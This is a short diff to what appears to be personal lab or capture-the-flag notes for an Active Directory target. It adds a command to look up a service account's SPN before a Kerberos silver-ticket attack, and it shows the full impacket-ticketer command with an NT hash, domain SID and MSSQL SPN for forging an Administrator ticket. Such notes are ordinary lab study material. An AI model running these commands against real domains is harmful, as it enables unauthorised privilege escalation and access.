@@ -408,8 +408,10 @@ Get-LocalUser -Name 'svc_mssql' | select name,sid
 String Convert to NTLM hash:
 https://codebeautify.org/ntlm-hash-generator
 
-Exploiting silver ticket:
+Get SPN:
+Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
 
+Exploiting silver ticket:
 impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
 
 export KRB5CCNAME=$PWD/Administrator.ccache
